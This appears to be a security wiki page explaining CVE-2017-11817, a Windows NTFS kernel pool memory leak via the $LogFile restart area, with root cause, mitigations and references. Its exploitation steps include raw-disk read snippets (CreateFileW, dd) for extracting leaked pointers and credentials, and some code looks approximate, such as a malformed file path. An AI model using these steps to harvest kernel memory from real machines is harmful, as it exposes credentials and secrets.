# Windows NTFS Kernel Pool Memory Leak

{{#include ../../banners/hacktricks-training.md}}

## Overview

CVE-2017-11817 presents an information disclosure vulnerability in the Windows NTFS driver that has existed since Windows 2000. When mounting an NTFS volume on Windows 7 or earlier, the driver fails to zero-initialize a non-paged pool buffer in `LfsRestartLogFile`, writing uninitialized kernel pool memory to the `$LogFile` journal restart area with no additional privileges.

## Root Cause

In `Ntfs!LfsRestartLogFile`, the driver calls:

```c
ExAllocatePoolWithTag(NonPagedPool, 0x210, 'rsfL');
```

and immediately writes the allocated buffer to disk without zeroing it. Windows 8 and Server 2012+ insert a `memset` after allocation to clear the memory, eliminating the leak.

### Key Assembly (Windows 7 `NTFS.sys`)

```assembly
push 'rsfL'          ; tag for ExAllocatePoolWithTag
push 0x210           ; pool size
call ExAllocatePoolWithTag
mov [edi+0x198], eax ; store buffer pointer
; missing zeroing step here
; Windows 8+ adds:
call _memset          ; clear buffer to prevent leak
```

## Exploitation Steps

1. Mount an NTFS-formatted volume (e.g., plug in a USB drive or attach a VHD).
2. Access the hidden `$LogFile` via raw disk access:
   - **Win32 API**:
     ```c
     HANDLE h = CreateFileW(
         L"\\.\\C:/$LogFile",
         GENERIC_READ,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
         OPEN_EXISTING,
         0,
         NULL
     );
     ReadFile(h, buffer, 8192, &bytesRead, NULL);
     ```
   - **Using `dd`**:
     ```bash
dd if=\\.\\PhysicalDrive1 bs=8192 skip=768 count=1 of=leak.bin
```
3. Parse the 8192-byte region for two `"RSTR"` restart record signatures and extract the subsequent 3800-byte data sections containing leaked kernel pool data (pointers, credentials, etc.).
4. Analyze leaked data offline to discover sensitive information.

## Tools & PoC

- **Packet Storm PoC**: Automates discovery and dumping of restart records.
  https://packetstormsecurity.com/files/144644/

## Impact & Mitigation

- Attackers gain read-only access to uninitialized kernel memory, exposing sensitive information such as kernel pointers and credentials.
- **Mitigation**:
  - Update to Windows 8 / Server 2012 or later.
  - Apply Microsoft patches for CVE-2017-11817 on older systems.
  - Restrict mounting of untrusted NTFS volumes.

{{#include ../../banners/hacktricks-training.md}}

## References

- [Buried in the log: Exploiting a 20-Year-Old NTFS Vulnerability](https://swarm.ptsecurity.com/buried-in-the-log-exploiting-a-20-years-old-ntfs-vulnerability/)
- [Packet Storm PoC (ID 144644)](https://packetstormsecurity.com/files/144644/)
- [Microsoft CVE-2017-11817 Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-11817)
{{#include /banners/hacktricks-training.md}}
